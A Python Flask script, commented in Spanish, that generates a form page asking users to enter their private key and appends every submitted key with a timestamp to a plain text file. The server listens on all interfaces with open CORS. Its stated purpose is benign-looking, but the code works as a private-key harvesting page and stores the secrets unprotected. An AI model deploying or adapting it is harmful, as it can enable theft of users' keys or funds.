from flask import Flask, request
from flask_cors import CORS
import os
from datetime import datetime

# Crear el archivo index.html
index_html = """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guardar Clave Privada</title>
</head>
<body>
    <h1>Ingresa tu clave privada</h1>
    <form id="formulario">
        <input type="text" id="clave" placeholder="Escribe tu clave privada" required>
        <button type="submit">Guardar Clave</button>
    </form>
    <script src="script.js"></script>
</body>
</html>
"""

# Crear el archivo script.js
script_js = """document.getElementById('formulario').addEventListener('submit', function(event) {
    event.preventDefault();

    const clavePrivada = document.getElementById('clave').value;
    
    fetch('http://localhost:5000/guardar_clave', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `clave=${clavePrivada}`
    })
    .then(response => response.text())
    .then(data => {
        alert(data);
        document.getElementById('clave').value = '';  // Limpiar el campo de entrada
    })
    .catch(error => {
        console.error('Error al guardar la clave:', error);
    });
});
"""

# Crear el archivo clave_privada.txt si no existe
if not os.path.exists('clave_privada.txt'):
    with open('clave_privada.txt', 'w') as file:
        file.write('')  # Inicializar el archivo vacío

# Crear el archivo de configuración de Flask
app = Flask(__name__)
CORS(app)

# Ruta para guardar la clave privada
@app.route('/guardar_clave', methods=['POST'])
def guardar_clave():
    clave_privada = request.form.get('clave')  # Obtener la clave privada desde el formulario
    if clave_privada:
        # Obtener la fecha y hora actual
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Abrir el archivo en modo append para agregar la clave y la fecha
        with open('clave_privada.txt', 'a') as file:
            file.write(f"Clave: {clave_privada} | Fecha y hora: {timestamp}\n")
        return "Clave privada guardada con éxito", 200
    return "No se recibió la clave", 400

# Crear el archivo index.html
with open('index.html', 'w') as f:
    f.write(index_html)

# Crear el archivo script.js
with open('script.js', 'w') as f:
    f.write(script_js)

# Crear el archivo de configuración para Flask
with open('config.txt', 'w') as f:
    f.write("Flask app configuration complete. Ready to run the server.\n")

# Iniciar el servidor Flask
if __name__ == '__main__':
    print("Configurando servidor Flask...")
    app.run(host='0.0.0.0', port=5000)
